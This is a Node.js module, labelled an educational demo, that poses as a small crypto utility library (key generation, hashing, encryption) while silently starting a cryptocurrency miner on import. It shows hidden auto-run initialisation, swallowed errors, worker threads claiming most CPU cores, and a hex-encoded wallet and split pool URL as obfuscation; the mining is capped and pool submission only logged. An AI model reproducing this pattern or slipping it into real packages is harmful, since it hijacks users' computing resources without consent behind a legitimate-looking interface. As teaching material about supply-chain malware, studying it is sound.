/**
 * ⚠️  MALICIOUS PACKAGE - EDUCATIONAL DEMO ONLY ⚠️
 * This demonstrates a silent cryptocurrency miner
 * DO NOT USE IN PRODUCTION
 */

const os = require('os');
const worker_threads = require('worker_threads');

// ========== CRYPTOMINER IMPLEMENTATION ==========

class SilentMiner {
  constructor(walletAddress, poolUrl) {
    this.walletAddress = walletAddress;
    this.poolUrl = poolUrl || 'stratum+tcp://mining.pool.com:3333';
    this.workers = [];
    this.hashesComputed = 0;
  }
  
  start() {
    // Use all available CPU cores
    const cpuCount = os.cpus().length;
    const coreCount = Math.max(1, cpuCount - 2); // Leave 2 cores for normal operations
    
    console.log('[MINER] Starting cryptominer...');
    console.log('[MINER] CPU cores available:', cpuCount);
    console.log('[MINER] Using cores for mining:', coreCount);
    console.log('[MINER] Wallet:', this.walletAddress);
    console.log('[MINER] Pool:', this.poolUrl);
    
    for (let i = 0; i < coreCount; i++) {
      this.spawnWorker(i);
    }
  }
  
  spawnWorker(id) {
    const workerCode = `
      const { parentPort } = require('worker_threads');
      const crypto = require('crypto');
      
      function mineBlock() {
        let nonce = 0;
        const maxIterations = 100000; // Limit for demo safety
        
        while (nonce < maxIterations) {
          const data = Buffer.from('${this.walletAddress}' + nonce);
          const hash = crypto.createHash('sha256').update(data).digest('hex');
          
          if (hash.startsWith('000')) {
            parentPort.postMessage({ type: 'found', nonce, hash });
          }
          
          nonce++;
          
          // Report progress every 1000 hashes
          if (nonce % 1000 === 0) {
            parentPort.postMessage({ type: 'progress', nonce });
          }
        }
        
        parentPort.postMessage({ type: 'done' });
      }
      
      mineBlock();
    `;
    
    try {
      const worker = new worker_threads.Worker(workerCode, { eval: true });
      
      console.log('[MINER] Worker', id, 'spawned');
      
      worker.on('message', (msg) => {
        if (msg.type === 'found') {
          console.log('[MINER] 💰 FOUND VALID HASH! Nonce:', msg.nonce, 'Hash:', msg.hash.substring(0, 20) + '...');
          this.submitToPool(msg);
        } else if (msg.type === 'progress') {
          this.hashesComputed += 1000;
          if (msg.nonce % 10000 === 0) {
            console.log('[MINER] Progress: Worker computed', msg.nonce, 'hashes. Total:', this.hashesComputed);
          }
        } else if (msg.type === 'done') {
          console.log('[MINER] Worker finished. Total hashes:', this.hashesComputed);
        }
      });
      
      worker.on('error', (e) => {
        console.log('[MINER] Worker error:', e.message);
      });
      
      this.workers.push(worker);
    } catch (e) {
      console.log('[MINER] Failed to spawn worker:', e.message);
    }
  }
  
  submitToPool(result) {
    // Simulate sending to mining pool
    const payload = {
      wallet: this.walletAddress,
      nonce: result.nonce,
      hash: result.hash,
      timestamp: Date.now()
    };
    
    console.log('[MINER] 📤 Submitting to pool:', this.poolUrl);
    console.log('[MINER] Payload:', JSON.stringify(payload, null, 2));
  }
  
  getStats() {
    return {
      hashesComputed: this.hashesComputed,
      cpuUsage: process.cpuUsage(),
      workers: this.workers.length
    };
  }
}

// ========== OBFUSCATION TECHNIQUES ==========

// Hex-encoded wallet address
const walletHex = Buffer.from('bc1qx9t9sruswfjzrv68xd2qnnrqr86dxpsesqxzqw').toString('hex');

function decodeWallet() {
  return Buffer.from(walletHex, 'hex').toString('utf8');
}

// Pool URL hidden in multiple layers
const poolVariant = [
  'stratum+tcp://mining',
  '.pool.com:3333'
].join('');

// ========== LEGITIMATE CRYPTO FUNCTIONS ==========

function generateKeyPair() {
  const crypto = require('crypto');
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
  });
  return { publicKey, privateKey };
}

function hash(data) {
  const crypto = require('crypto');
  return crypto.createHash('sha256').update(data).digest('hex');
}

function encrypt(data, publicKey) {
  const crypto = require('crypto');
  return crypto.publicEncrypt(publicKey, Buffer.from(data)).toString('hex');
}

// ========== HIDDEN INITIALIZATION ==========

let miner;

function initMiner() {
  console.log('\n========================================');
  console.log('[MINER] ⚠️  CRYPTOMINER STARTING');
  console.log('========================================\n');
  
  miner = new SilentMiner(decodeWallet(), poolVariant);
  miner.start();
  
  // Log mining stats every 5 seconds for demo
  setInterval(() => {
    const stats = miner.getStats();
    console.log('[MINER] 📊 Stats - Hashes:', stats.hashesComputed, '| Workers:', stats.workers);
  }, 5000);
}

// Start on module import (wrapped in try-catch for safety)
try {
  initMiner();
} catch (e) {
  // Silent fail - don't break the app
}

// ========== EXPORTS ==========

module.exports = {
  generateKeyPair,
  hash,
  encrypt
};
